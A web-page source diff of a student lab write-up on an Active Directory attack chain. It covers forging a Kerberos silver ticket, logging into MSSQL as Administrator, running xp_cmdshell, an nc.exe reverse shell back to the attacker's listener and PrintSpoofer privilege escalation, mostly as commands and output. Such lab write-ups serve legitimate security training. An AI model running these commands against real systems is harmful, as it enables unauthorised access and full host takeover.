-        <figcaption><span class="fig-lbl">FIG 03</span><span class="fig-alt">ticketer success — <code>Administrator.ccache</code> written to the current directory, ready to load into <code>KRB5CCNAME</code>.</span></figcaption>
-      </figure>
+      <blockquote>
+        <p>The SPN, domain SID, and NT hash were all acquired by the previous commands. Because we are forging with <code>-nthash</code>, the ticket is RC4-encrypted; if the service enforced AES, we would need <code>-aesKey</code> instead.</p>
+      </blockquote>
 
-      <p>Load the ticket and verify with <code>klist</code>:</p>
+      <figure>
+        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · ticketer output, Administrator.ccache created</span></div>
+        <figcaption><span class="fig-lbl">FIG 08</span><span class="fig-alt">Silver ticket forged successfully — Administrator.ccache written to the current directory.</span></figcaption>
+      </figure>
 
       <div class="cb" data-host="attacker">
         <div class="cb-head">
           <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">env</span></span>
           <span class="cb-lang">bash · load ticket</span>
-          <button class="copy" data-idx="12">cp</button>
+          <button class="copy" data-idx="14">cp</button>
         </div>
-        <pre><span class="prm">$</span> <span class="cmd">export</span> <span class="var">KRB5CCNAME</span>=<span class="var">$(</span><span class="cmd">pwd</span><span class="var">)</span>/<span class="arg">Administrator.ccache</span>
-<span class="prm">$</span> <span class="cmd">klist</span>
-<span class="out">Ticket cache: FILE:.../Administrator.ccache
+        <pre><span class="prm">└─$</span> <span class="cmd">export</span> <span class="var">KRB5CCNAME</span>=<span class="var">$(</span><span class="cmd">pwd</span><span class="var">)</span>/<span class="arg">Administrator.ccache</span></pre>
+      </div>
+
+      <h3 id="krb5">Setting Up krb5 to Use Tickets</h3>
+
+      <div class="cb" data-host="attacker">
+        <div class="cb-head">
+          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">→ 240.0.0.1</span></span>
+          <span class="cb-lang">bash · generate krb5.conf</span>
+          <button class="copy" data-idx="15">cp</button>
+        </div>
+        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
+└─$</span> <span class="cmd">nxc smb</span> <span class="arg">240.0.0.1</span> <span class="flag">-u</span> <span class="str">'svc_mssql'</span> <span class="flag">-p</span> <span class="str">'Passw0rd123!'</span> <span class="flag">--generate-krb5-file</span> <span class="arg">krb5.conf</span>
+<span class="out">SMB  240.0.0.1  445  SRV01  [*] Windows 10 / Server 2019 Build 17763 x64 (domain:corp.local)
+SMB  240.0.0.1  445  SRV01  [+] krb5 conf saved to: krb5.conf
+SMB  240.0.0.1  445  SRV01  [+] Run: export KRB5_CONFIG=krb5.conf</span>
+<span class="prm">└─$</span> <span class="cmd">sudo cp</span> <span class="arg">krb5.conf</span> <span class="arg">/etc/krb5.conf</span></pre>
+      </div>
+
+      <p>The <code>krb5.conf</code> file contains the configuration needed to interact with Kerberos, such as the KDC location, realms, and additional settings:</p>
+
+      <div class="cb" data-host="attacker">
+        <div class="cb-head">
+          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">/etc/krb5.conf</span></span>
+          <span class="cb-lang">config · realm definition</span>
+          <button class="copy" data-idx="16">cp</button>
+        </div>
+        <pre><span class="out">$ cat /etc/krb5.conf
+[libdefaults]
+    dns_lookup_kdc = false
+    dns_lookup_realm = false
+    default_realm = CORP.LOCAL
+
+[realms]
+    CORP.LOCAL = &#123;
+        kdc = srv01.corp.local
+        admin_server = srv01.corp.local
+        default_domain = corp.local
+    &#125;
+
+[domain_realm]
+    .corp.local = CORP.LOCAL
+    corp.local = CORP.LOCAL</span></pre>
+      </div>
+
+      <figure>
+        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · krb5.conf content showing realm config</span></div>
+        <figcaption><span class="fig-lbl">FIG 09</span><span class="fig-alt">Generated krb5.conf mapping CORP.LOCAL realm to the KDC at srv01.corp.local (which resolves to 240.0.0.1 via /etc/hosts).</span></figcaption>
+      </figure>
+
+      <h3 id="klist">Checking That the Ticket Is in Memory</h3>
+
+      <div class="cb" data-host="attacker">
+        <div class="cb-head">
+          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">env</span></span>
+          <span class="cb-lang">bash · klist</span>
+          <button class="copy" data-idx="17">cp</button>
+        </div>
+        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
+└─$</span> <span class="cmd">klist</span>
+<span class="out">Ticket cache: FILE:/home/kali/Documents/lab/Administrator.ccache
 Default principal: Administrator@CORP.LOCAL
 
 Valid starting       Expires              Service principal
-05/14/2026 09:45:39  05/11/2036 09:45:39  MSSQL/srv01.corp.local@CORP.LOCAL</span></pre>
+05/14/2026 09:45:39  05/11/2036 09:45:39  MSSQL/srv01.corp.local@CORP.LOCAL
+        renew until 05/11/2036 09:45:39</span></pre>
       </div>
 
-      <div class="step"><span class="step-n">Step 6</span><span>Authenticate and get execution</span></div>
+      <figure>
+        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · klist showing Administrator ticket loaded</span></div>
+        <figcaption><span class="fig-lbl">FIG 10</span><span class="fig-alt">Ticket is loaded and ready — valid for MSSQL/srv01.corp.local@CORP.LOCAL as Administrator.</span></figcaption>
+      </figure>
 
-      <p>Connect using Kerberos — no password, use the forged ticket:</p>
+      <!-- ======================================================= -->
+      <h2 id="shell"><span class="num">05.</span> Getting a Shell</h2>
 
       <div class="cb" data-host="attacker">
         <div class="cb-head">
           <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">→ mssql · kerberos</span></span>
           <span class="cb-lang">bash · authenticate with forged tgs</span>
-          <button class="copy" data-idx="13">cp</button>
+          <button class="copy" data-idx="18">cp</button>
         </div>
-        <pre><span class="prm">$</span> <span class="cmd">impacket-mssqlclient</span> <span class="flag">-k</span> <span class="flag">-no-pass</span> <span class="arg">Administrator@srv01.corp.local</span>
-<span class="out">[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
+└─$</span> <span class="cmd">impacket-mssqlclient</span> <span class="flag">-k</span> <span class="flag">-no-pass</span> <span class="arg">Administrator@srv01.corp.local</span>
+<span class="out">Impacket v0.14.0.dev0 - Copyright Fortra, LLC
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] INFO(srv01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+[!] Press help for extra shell commands
 SQL (CORP\Administrator  dbo@master)&gt;</span></pre>
       </div>
 
-      <p>Enable and use <code>xp_cmdshell</code>:</p>
+      <p>We have successfully logged in as Administrator on MSSQL. Now we are able to execute commands:</p>
 
       <div class="cb" data-host="sql">
         <div class="cb-head">
           <span class="cb-host"><span class="ico">⊞</span><span class="hw">mssql</span><span class="hwo">as Administrator (forged)</span></span>
-          <span class="cb-lang">sql · post-auth</span>
-          <button class="copy" data-idx="14">cp</button>
+          <span class="cb-lang">sql · enable and run xp_cmdshell</span>
+          <button class="copy" data-idx="19">cp</button>
         </div>
-        <pre><span class="prm">SQL&gt;</span> <span class="kw">enable_xp_cmdshell</span>
-<span class="prm">SQL&gt;</span> <span class="kw">xp_cmdshell</span> <span class="str">"whoami /priv"</span>
-<span class="out">output
-----------------------------------------------------
-corp\svc_mssql
+        <pre><span class="prm">SQL (CORP\Administrator  dbo@master)&gt;</span> <span class="kw">enable_xp_cmdshell</span>
+<span class="out">INFO(srv01\SQLEXPRESS): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1.</span>
 
-SeImpersonatePrivilege        Impersonate a client   Enabled</span></pre>
+<span class="prm">SQL (CORP\Administrator  dbo@master)&gt;</span> <span class="kw">xp_cmdshell</span> <span class="str">"cd C:\temp &amp;&amp; dir"</span>
+<span class="out">output
+---------------------------------------------------------
+ Directory of C:\Temp
+
+05/14/2026  06:30 AM     7,302,656 agent.exe
+05/14/2026  06:59 AM        59,392 nc.exe
+05/14/2026  06:58 AM        27,136 PrintSpoofer64.exe</span></pre>
       </div>
 
-      <p>The OS-level <code>whoami</code> returns <code>svc_mssql</code>, not <code>Administrator</code>. Expected — the silver ticket authenticates us at the MSSQL layer, but <code>xp_cmdshell</code> runs under the account MSSQL itself runs as. That account carries <code>SeImpersonatePrivilege</code>.</p>
-
-      <p>Spawn a reverse shell and escalate:</p>
+      <p>We can use our previous Evil-WinRM session to upload PrintSpoofer and nc.exe. Now spawn the reverse shell:</p>
 
       <div class="cb" data-host="sql">
         <div class="cb-head">
           <span class="cb-host"><span class="ico">⊞</span><span class="hw">mssql</span><span class="hwo">→ reverse shell</span></span>
-          <span class="cb-lang">sql · callback</span>
-          <button class="copy" data-idx="15">cp</button>
+          <span class="cb-lang">sql · nc callback</span>
+          <button class="copy" data-idx="20">cp</button>
         </div>
-        <pre><span class="prm">SQL&gt;</span> <span class="kw">xp_cmdshell</span> <span class="str">"C:\temp\nc.exe 10.10.14.5 4445 -e cmd"</span></pre>
+        <pre><span class="prm">SQL (CORP\Administrator  dbo@master)&gt;</span> <span class="kw">xp_cmdshell</span> <span class="str">"C:\temp\nc.exe 10.10.14.5 4445 -e cmd"</span></pre>
       </div>
+
+      <figure>
+        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · xp_cmdshell executing nc.exe reverse shell</span></div>
+        <figcaption><span class="fig-lbl">FIG 11</span><span class="fig-alt">nc.exe launched via xp_cmdshell, dialing back to attacker on port 4445.</span></figcaption>
+      </figure>
+
+      <h3 id="new-session">Creating a New Session</h3>
+
+      <div class="cb" data-host="attacker">
+        <div class="cb-head">
+          <span class="cb-host"><span class="ico">⌬</span><span class="hw">attacker</span><span class="hwo">listener</span></span>
+          <span class="cb-lang">bash · catch the shell</span>
+          <button class="copy" data-idx="21">cp</button>
+        </div>
+        <pre><span class="prm">┌──(kali㉿kali)-[~/Documents/lab]
+└─$</span> <span class="cmd">rlwrap -cAr nc -lvnp 4445</span>
+<span class="out">listening on [any] 4445 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.10.20] 50335
+Microsoft Windows [Version 10.0.17763.4252]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; whoami
+corp\svc_mssql</span></pre>
+      </div>
+
+      <!-- ======================================================= -->
+      <h2 id="why"><span class="num">06.</span> Why Aren't We <code>NT AUTHORITY\SYSTEM</code>?</h2>
+
+      <p>To run <code>xp_cmdshell</code> at all, we had to forge the Administrator silver ticket; a low-privileged user would not have the rights to enable and run <code>xp_cmdshell</code>. However, <code>xp_cmdshell</code> does not run commands as the SQL login you authenticated with; it runs them under the account the MSSQL service itself runs as, which here is <code>svc_mssql</code>. That is why the shell comes back as <code>svc_mssql</code> rather than <code>Administrator</code>.</p>
+
+      <p>We are still not <code>NT AUTHORITY\SYSTEM</code> either, but that does not matter, because service accounts like this one carry high privileges (notably <code>SeImpersonatePrivilege</code>) that let us escalate the rest of the way.</p>
+
+      <!-- ======================================================= -->
+      <h2 id="privesc"><span class="num">07.</span> Privilege Escalation</h2>
 
       <div class="cb" data-host="target-win">
         <div class="cb-head">
           <span class="cb-host"><span class="ico">⊟</span><span class="hw">reverse shell</span><span class="hwo">as svc_mssql</span></span>
-          <span class="cb-lang">cmd · PrintSpoofer</span>
-          <button class="copy" data-idx="16">cp</button>
+          <span class="cb-lang">cmd · check privileges</span>
+          <button class="copy" data-idx="22">cp</button>
         </div>
-        <pre><span class="out">C:\Windows\system32&gt; whoami
-corp\svc_mssql</span>
+        <pre><span class="prm">C:\Windows\system32&gt;</span> <span class="cmd">whoami /priv</span>
+<span class="out">
+PRIVILEGES INFORMATION
+----------------------
 
-<span class="prm">C:\Temp&gt;</span> <span class="cmd">PrintSpoofer64.exe</span> <span class="flag">-i</span> <span class="flag">-c</span> <span class="arg">cmd</span>
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span></pre>
+      </div>
+
+      <p>We have <code>SeImpersonatePrivilege</code> — which means we can escalate our privileges even further using PrintSpoofer:</p>
+
+      <div class="cb" data-host="target-win">
+        <div class="cb-head">
+          <span class="cb-host"><span class="ico">⊟</span><span class="hw">reverse shell</span><span class="hwo">svc_mssql → srv01$</span></span>
+          <span class="cb-lang">cmd · PrintSpoofer</span>
+          <button class="copy" data-idx="23">cp</button>
+        </div>
+        <pre><span class="prm">C:\Temp&gt;</span> <span class="cmd">PrintSpoofer64.exe</span> <span class="flag">-i</span> <span class="flag">-c</span> <span class="arg">cmd</span>
 <span class="out">[+] Found privilege: SeImpersonatePrivilege
 [+] Named pipe listening...
 [+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.17763.4252]
+(c) 2018 Microsoft Corporation. All rights reserved.
 
 C:\Windows\system32&gt; whoami
 corp\srv01$</span></pre>
       </div>
 
-      <figure>
-        <div class="ph"><span class="ph-label"><span class="ph-gl">▸</span> screenshot · whoami /priv as srv01$ (machine account)</span></div>
-        <figcaption><span class="fig-lbl">FIG 04</span><span class="fig-alt">PrintSpoofer escalation complete — machine account <code>srv01$</code> with full SYSTEM-equivalent privilege set.</span></figcaption>
-      </figure>
+      <h3 id="checking-privs">Checking Privileges</h3>
 
-      <h2 id="breaks"><span class="num">05.</span> What Typically Breaks</h2>
+      <div class="cb" data-host="target-win">
+        <div class="cb-head">
+          <span class="cb-host"><span class="ico">⊟</span><span class="hw">target</span><span class="hwo">as srv01$ (machine account)</span></span>
+          <span class="cb-lang">cmd · full privilege set</span>
+          <button class="copy" data-idx="24">cp</button>
+        </div>
+        <pre><span class="prm">C:\Windows\system32&gt;</span> <span class="cmd">whoami /priv</span>
+<span class="out">
+PRIVILEGES INFORMATION
+----------------------
 
-      <h3 id="clock-skew">Clock skew</h3>
-      <p>Kerberos rejects tickets with timestamps more than 5 minutes off the KDC's clock. If your VM has been suspended or time sync is broken, every Kerberos operation will fail with cryptic errors. Sync before troubleshooting anything else: <code>sudo ntpdate &lt;DC-IP&gt;</code>.</p>
+Privilege Name                            Description                                        State
+========================================= ================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                         Enabled
+SeSystemtimePrivilege                     Change the system time                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                  Enabled
+SeBackupPrivilege                         Back up files and directories                      Enabled
+SeRestorePrivilege                        Restore files and directories                      Enabled
+SeShutdownPrivilege                       Shut down the system                               Enabled
+SeDebugPrivilege                          Debug programs                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                Enabled
+SeUndockPrivilege                         Remove computer from docking station               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts for delegation   Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication          Enabled
+SeCreateGlobalPrivilege                   Create global objects                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                     Enabled
+SeTimeZonePrivilege                       Change the time zone                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user     Enabled</span></pre>
+      </div>
 
-      <h3 id="spn-mismatch">SPN format mismatch</h3>
-      <p>The SPN passed to <code>ticketer</code> must match what the service expects exactly — case-sensitive prefix, FQDN not short name. For MSSQL it's usually <code>MSSQLSvc/host.domain</code> or <code>MSSQLSvc/host.domain:port</code>. Wrong SPN means the service rejects the ticket as not addressed to it. Use <code>GetUserSPNs</code> output verbatim.</p>
+      <p>Despite not being logged in as <code>NT AUTHORITY\SYSTEM</code>, we have the same privileges and permissions as it does, which means we have successfully completed our goal.</p>
 
-      <h3 id="hostname-ip">Hostname vs. IP in the client</h3>
-      <p>If you pass <code>240.0.0.1</code> to <code>mssqlclient</code> instead of the FQDN, the client builds <code>MSSQLSvc/240.0.0.1</code> which won't match anything. Always use the hostname — and verify <code>/etc/hosts</code> maps it to the tunneled IP.</p>
-
-      <h3 id="wrong-sid">Wrong domain SID</h3>
-      <p><code>lookupsid</code> sometimes returns the SID of the local machine instead of the domain if you query the wrong host. The domain SID ends after the three sub-authorities: <code>S-1-5-21-X-Y-Z</code>. If yours has <code>-500</code> or <code>-1001</code> on the end, you grabbed a user SID, not the domain SID.</p>
-
-      <h3 id="enctype">Encryption type mismatch</h3>
-      <p>By default <code>ticketer</code> produces RC4-encrypted tickets (<code>-nthash</code>). If the target enforces AES-only Kerberos, the ticket will be rejected. In that case you need the AES256 key and the <code>-aesKey</code> flag instead.</p>
-
-      <h2 id="wrap"><span class="num">06.</span> Wrap-up</h2>
-
-      <p>The silver ticket primitive is well-documented. What's underdocumented is what happens when the target service is one tunnel away from the operator — and that's the situation most internal engagements actually present. The forgery itself doesn't change. The work shifts to aligning routing, name resolution, and local Kerberos config so the forged ticket reaches a service the client can actually authenticate to.</p>
-
-      <p>The pattern — <strong>compromise a service account, pivot to its service, forge a ticket against its SPN</strong> — is one of the most reliable ways to convert an AD foothold into administrative access on a target. Worth practicing until each of the three subsystems is muscle memory.</p>
+      <!-- ======================================================= -->
+      <h2 id="refs"><span class="num">08.</span> References</h2>
 
       <div class="reading">
         <h3>▸ references</h3>
         <ul>
-          <li>Sean Metcalf — <a href="https://adsecurity.org/?p=2011" target="_blank" rel="noopener">Silver ticket deep-dive (adsecurity.org)</a></li>
-          <li><a href="https://www.hackingarticles.in/domain-persistence-silver-ticket-attack/" target="_blank" rel="noopener">Domain persistence: silver ticket attack (hackingarticles.in)</a></li>
-          <li><a href="https://github.com/nicocha30/ligolo-ng" target="_blank" rel="noopener">Ligolo-ng — github.com/nicocha30/ligolo-ng</a></li>
-          <li><a href="https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/" target="_blank" rel="noopener">A detailed guide on Ligolo-ng (hackingarticles.in)</a></li>
-          <li><a href="https://web.mit.edu/kerberos/krb5-1.12/doc/admin/conf_files/krb5_conf.html" target="_blank" rel="noopener">krb5.conf reference (MIT Kerberos)</a></li>
+          <li><a href="https://web.mit.edu/kerberos/krb5-1.12/doc/admin/conf_files/krb5_conf.html" target="_blank" rel="noopener">krb5.conf reference — MIT Kerberos</a></li>
           <li><a href="https://github.com/itm4n/PrintSpoofer" target="_blank" rel="noopener">PrintSpoofer — github.com/itm4n/PrintSpoofer</a></li>
+          <li><a href="https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/" target="_blank" rel="noopener">A detailed guide on Ligolo-ng — hackingarticles.in</a></li>
+          <li><a href="https://adsecurity.org/?p=2011" target="_blank" rel="noopener">Silver ticket deep-dive — adsecurity.org</a></li>
+          <li><a href="https://www.hackingarticles.in/domain-persistence-silver-ticket-attack/" target="_blank" rel="noopener">Domain persistence: silver ticket attack — hackingarticles.in</a></li>
         </ul>
       </div>
 
       <!-- article footer -->
       <div class="doc-foot">
-
         <div class="author-card">
           <div class="avatar">W</div>
           <div>
             <div class="aw">whisperx00</div>
-            <div class="ad">offensive security student · OSCP candidate. step-by-step notes on techniques i keep needing to re-derive.</div>
+            <div class="ad">offensive security student · OSCP candidate. step-by-step notes on techniques worth documenting.</div>
           </div>
           <div class="alinks">
             <a href="/about/">./about</a>
@@ -441,9 +658,7 @@ corp\srv01$</span></pre>
             <a href="mailto:gm.manoel.albino@proton.me">mail</a>
           </div>
         </div>
-
         <a href="/articles/" class="back-all">← all articles</a>
-
       </div>
 
     </article>
@@ -452,17 +667,19 @@ corp\srv01$</span></pre>
     <aside class="toc">
       <h4>▸ on this page</h4>
       <ol id="tocList">
-        <li><a href="#scenario">01. The Scenario</a></li>
-        <li><a href="#why">02. Why Silver Tickets Work</a></li>
-        <li><a href="#subsystems">03. The Three Subsystems</a></li>
-        <li><a href="#walkthrough">04. Walkthrough</a></li>
-        <li><a href="#breaks">05. What Typically Breaks</a></li>
-        <li><a href="#wrap">06. Wrap-up</a></li>
+        <li><a href="#intro">01. Introduction</a></li>
+        <li><a href="#scenario">02. Scenario &amp; Setup</a></li>
+        <li><a href="#tunnel">03. Step 1: Tunnel</a></li>
+        <li><a href="#silver">04. Silver Ticket Attack</a></li>
+        <li><a href="#shell">05. Getting a Shell</a></li>
+        <li><a href="#why">06. Why svc_mssql?</a></li>
+        <li><a href="#privesc">07. Privilege Escalation</a></li>
+        <li><a href="#refs">08. References</a></li>
       </ol>
       <div class="toc-meta">
-        <span><span class="tk">format</span><span class="tv">article</span></span>
+        <span><span class="tk">format</span><span class="tv">guide</span></span>
         <span><span class="tk">published</span><span class="tv">2026-05-14</span></span>
-        <span><span class="tk">read time</span><span class="tv">~12 min</span></span>
+        <span><span class="tk">read time</span><span class="tv">~13 min</span></span>
         <span><span class="tk">license</span><span class="tv">CC BY 4.0</span></span>
       </div>
     </aside>
@@ -476,7 +693,6 @@ corp\srv01$</span></pre>
 </Layout>
 
 <style is:global>
-/* reading progress bar — fixed, must be global */
 .progress { position:fixed;top:0;left:0;height:2px;width:0%;background:var(--mauve);z-index:50;transition:width .1s;pointer-events:none; }
 .toTop { position:fixed;right:18px;bottom:72px;width:38px;height:38px;background:var(--mantle);border:1px solid var(--surface1);border-left:2px solid var(--green);color:var(--sub);font-family:var(--mono);font-size:14px;display:flex;align-items:center;justify-content:center;cursor:pointer;opacity:0;pointer-events:none;transition:opacity .2s,color .15s,border-color .15s;z-index:50; }
 .toTop.show { opacity:1;pointer-events:auto; }
@@ -486,18 +702,16 @@ corp\srv01$</span></pre>
 <style>
 .art-main { max-width:1200px;margin:0 auto;padding:36px 28px 80px; }
 
-/* breadcrumb */
 .crumb { font-size:12px;color:var(--dim);margin-bottom:18px;display:flex;align-items:center;gap:8px;flex-wrap:wrap; }
 .crumb a { color:var(--sub);transition:color .15s; }
 .crumb a:hover { color:var(--mauve); }
 .crumb .sep { color:var(--surface1); }
 .crumb .here { color:var(--text); }
 
-/* doc header */
 .doc-head { border-bottom:1px dashed var(--surface1);padding-bottom:22px;margin-bottom:32px; }
 .doc-label { font-size:10.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--mauve);margin-bottom:14px;display:inline-flex;align-items:center;gap:8px; }
 .doc-label::before { content:"";display:inline-block;width:6px;height:6px;background:currentColor; }
-.doc-head h1 { font-family:var(--sans);font-weight:700;font-size:clamp(26px,4vw,40px);line-height:1.18;letter-spacing:-.02em;color:var(--text);margin:0 0 18px; }
+.doc-head h1 { font-family:var(--sans);font-weight:700;font-size:clamp(22px,3.5vw,38px);line-height:1.2;letter-spacing:-.02em;color:var(--text);margin:0 0 18px; }
 .doc-meta { display:flex;flex-wrap:wrap;gap:6px 22px;align-items:center;font-size:11.5px;color:var(--dim); }
 .doc-meta .k { color:var(--dim);margin-right:5px; }
 .doc-meta .v { color:var(--sub); }
@@ -505,12 +719,10 @@ corp\srv01$</span></pre>
 .doc-tags { display:flex;flex-wrap:wrap;gap:6px;margin-top:14px; }
 .dtag { font-size:10.5px;color:var(--dim);background:var(--base);border:1px solid var(--surface1);padding:2px 8px;letter-spacing:.02em; }
 
-/* layout */
 .art-layout { display:grid;grid-template-columns:1fr 240px;gap:48px;align-items:start; }
 @media (max-width:980px) { .art-layout { grid-template-columns:1fr; } aside.toc { position:static; } }
 
-/* article prose */
-article { font-family:var(--sans);font-size:16px;line-height:1.78;color:var(--sub);max-width:75ch; }
+article { font-family:var(--sans);font-size:15.5px;line-height:1.78;color:var(--sub);max-width:75ch; }
 article p { margin:0 0 16px; }
 article strong { color:var(--text);font-weight:600; }
 article em { color:var(--text); }
@@ -519,54 +731,38 @@ article a:hover { color:var(--text);border-bottom-color:var(--text); }
 article ul,article ol { margin:0 0 18px;padding-left:22px; }
 article li { margin-bottom:6px; }
 article li::marker { color:var(--mauve); }
-article code:not(pre code) { font-family:var(--mono);font-size:13.5px;background:var(--surface0);color:var(--peach);padding:1px 6px;border:1px solid var(--surface1); }
+article code:not(pre code) { font-family:var(--mono);font-size:13px;background:var(--surface0);color:var(--peach);padding:1px 6px;border:1px solid var(--surface1); }
 
-/* headings */
-article h2 { font-family:var(--mono);font-weight:700;font-size:19px;color:var(--text);letter-spacing:-.005em;margin:48px 0 14px;padding-top:12px;border-top:1px dashed var(--surface1);scroll-margin-top:80px;display:flex;align-items:baseline;gap:10px; }
+article h2 { font-family:var(--mono);font-weight:700;font-size:18px;color:var(--text);letter-spacing:-.005em;margin:48px 0 14px;padding-top:12px;border-top:1px dashed var(--surface1);scroll-margin-top:80px;display:flex;align-items:baseline;gap:10px; }
 article h2::before { content:"▸";color:var(--mauve);font-size:14px;flex-shrink:0; }
 article h2 .num { color:var(--dim);font-size:14px;letter-spacing:.04em;font-weight:500; }
-article h3 { font-family:var(--mono);font-weight:600;font-size:15px;color:var(--peach);margin:28px 0 10px;letter-spacing:.005em;scroll-margin-top:80px; }
+article h3 { font-family:var(--mono);font-weight:600;font-size:14.5px;color:var(--peach);margin:28px 0 10px;letter-spacing:.005em;scroll-margin-top:80px; }
 article h3::before { content:"$ ";color:var(--green);font-weight:700; }
 
-/* blockquote */
-article blockquote { margin:0 0 24px;padding:14px 18px;background:var(--mantle);border:1px solid var(--surface1);border-left:2px solid var(--peach);color:var(--sub);font-size:14.5px;line-height:1.7;font-style:normal;display:flex;gap:14px;align-items:flex-start; }
+article blockquote { margin:0 0 22px;padding:12px 16px;background:var(--mantle);border:1px solid var(--surface1);border-left:2px solid var(--peach);color:var(--sub);font-size:13.5px;line-height:1.7;font-style:normal;display:flex;gap:14px;align-items:flex-start; }
 article blockquote::before { content:"NOTE";color:var(--peach);font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:.12em;border:1px solid var(--peach);padding:2px 7px;margin-top:2px;flex-shrink:0; }
 article blockquote p { margin:0; }
 
-/* figures */
-figure { margin:22px 0 26px; }
+figure { margin:20px 0 24px; }
 .ph { width:100%;background:var(--mantle);border:1px solid var(--surface1);border-left:2px solid var(--teal);aspect-ratio:16/9;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden; }
-.ph::before { content:"";position:absolute;inset:0;background-image:repeating-linear-gradient(135deg, color-mix(in oklab,var(--surface0) 60%, transparent) 0 2px, transparent 2px 12px);opacity:.7; }
+.ph::before { content:"";position:absolute;inset:0;background-image:repeating-linear-gradient(135deg,color-mix(in oklab,var(--surface0) 60%,transparent) 0 2px,transparent 2px 12px);opacity:.7; }
 .ph-label { position:relative;z-index:1;font-family:var(--mono);font-size:11.5px;color:var(--sub);background:var(--crust);border:1px solid var(--surface1);padding:6px 12px;letter-spacing:.04em;display:flex;align-items:center;gap:10px; }
 .ph-gl { color:var(--teal);font-weight:700; }
-figcaption { font-family:var(--mono);font-size:11.5px;color:var(--dim);margin-top:8px; }
+figcaption { font-family:var(--mono);font-size:11px;color:var(--dim);margin-top:8px; }
 .fig-lbl { color:var(--teal);margin-right:8px;letter-spacing:.04em; }
 .fig-alt { color:var(--sub); }
 
-/* step labels */
-.step { display:inline-flex;align-items:center;gap:8px;background:var(--base);border:1px solid var(--surface1);border-left:2px solid var(--mauve);padding:4px 10px;font-family:var(--mono);font-size:11px;color:var(--sub);letter-spacing:.06em;text-transform:uppercase;margin:16px 0 10px; }
-.step-n { color:var(--mauve);font-weight:700; }
-
-/* three-subsystem grid */
-.triad { display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:18px 0 26px;font-family:var(--mono); }
-@media (max-width:820px) { .triad { grid-template-columns:1fr; } }
-.triad-card { background:var(--mantle);border:1px solid var(--surface1);border-top:2px solid var(--col,var(--mauve));padding:14px 16px; }
-.triad-card .tn { font-size:10.5px;letter-spacing:.12em;text-transform:uppercase;color:var(--col,var(--mauve));font-weight:600;margin-bottom:6px; }
-.triad-card .tt { font-family:var(--sans);font-weight:600;font-size:15px;color:var(--text);margin-bottom:6px; }
-.triad-card .td { font-size:12px;color:var(--sub);line-height:1.6; }
-
-/* code blocks */
-.cb { margin:0 0 22px;background:var(--crust);border:1px solid var(--surface1);border-left:2px solid var(--host,var(--green));font-family:var(--mono);font-size:13px;line-height:1.6;overflow:hidden; }
+.cb { margin:0 0 20px;background:var(--crust);border:1px solid var(--surface1);border-left:2px solid var(--host,var(--green));font-family:var(--mono);font-size:12.5px;line-height:1.6;overflow:hidden; }
 .cb-head { display:flex;align-items:center;gap:10px;background:var(--surface0);border-bottom:1px solid var(--surface1);font-size:10.5px;color:var(--sub);letter-spacing:.06em;text-transform:uppercase;min-height:30px;padding-right:10px; }
-.cb-host { display:inline-flex;align-items:center;gap:6px;padding:0 12px;height:30px;background:color-mix(in oklab, var(--host,var(--green)) 14%, var(--surface0));color:var(--host,var(--green));border-right:1px solid var(--surface1);font-weight:700;letter-spacing:.1em;font-size:10px;flex-shrink:0; }
